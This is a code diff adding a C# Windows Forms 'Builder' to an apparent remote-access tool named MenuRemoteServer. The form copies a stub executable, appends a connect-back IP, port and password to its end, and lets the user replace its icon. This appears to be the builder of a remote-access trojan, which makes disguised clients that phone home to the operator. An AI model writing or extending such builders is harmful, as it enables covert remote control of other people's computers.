@@ -1,0 +1,107 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Globalization;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace MenuRemoteServer
+{
+    public partial class Builder : Form
+    {
+        public Builder()
+        {
+            InitializeComponent();
+        }
+
+        private static string exeFinal = "";
+        private static string iconFile = "";
+
+        [DllImport("IconChanger.dll")]
+        static extern void ChangeIcon(String executableFile, String iconFile, short imageCount);
+
+        static public void ChangeIcon(string exeFilePath, string iconFilePath)
+        {
+            short imageCount = 0;
+
+            using (StreamReader sReader = new StreamReader(iconFilePath))
+            {
+                using (BinaryReader bReader = new BinaryReader(sReader.BaseStream))
+                {
+                    bReader.ReadInt16();
+                    bReader.ReadInt16();
+                    imageCount = bReader.ReadInt16();
+                }
+            }
+
+            ChangeIcon(exeFilePath, iconFilePath, imageCount);
+        }
+      
+        private void OK_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                string filepath = string.Empty;
+                SaveFileDialog saveDlg = new SaveFileDialog();
+                {
+                    saveDlg.FileName = "Client.exe";
+                    saveDlg.Filter = "Executable Files (*.exe)|*.exe";
+
+                    if (saveDlg.ShowDialog() == DialogResult.OK)
+                        filepath = saveDlg.FileName;
+                    else
+                        return;
+                }
+                File.Copy(Application.StartupPath + @"\stub.exe", filepath);
+
+                string split = "-whatever-";
+                string info = split + ip.Text +
+                split + porta.Text +
+                split + senha.Text + split;
+                ;
+
+                FileStream fs = new FileStream(filepath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
+                {
+                    BinaryWriter bw = new BinaryWriter(fs);
+                    fs.Position = fs.Length + 1;
+                    bw.Write(info);
+                    bw.Close();
+                }
+
+                if (iconFile != null)
+                {
+                    ChangeIcon(filepath, iconFile);
+                }
+
+                MessageBox.Show("Cliente configurado com sucesso!",
+                                "Informação",
+                                MessageBoxButtons.OK,
+                                MessageBoxIcon.Information,
+                                MessageBoxDefaultButton.Button1);
+
+                this.Close();
+            }
+            catch (Exception execao) { /*MessageBox.Show(execao.ToString()); this.Close();*/ }
+        }
+
+        private void trocarIcone_Click(object sender, EventArgs e)
+        {
+
+            openIcon.Title = "Selecionar ícone";
+            openIcon.Filter = "Icon Files (.ico)|*.ico";
+            openIcon.FilterIndex = 1;
+            DialogResult result = openIcon.ShowDialog();
+            if (result == DialogResult.OK)
+            {
+               iconFile = openIcon.FileName;
+               loadIcon.Image = Bitmap.FromHicon(new Icon(iconFile, new Size(Icon.Width, Icon.Height)).Handle);
+            }
+        }
+    }
+}
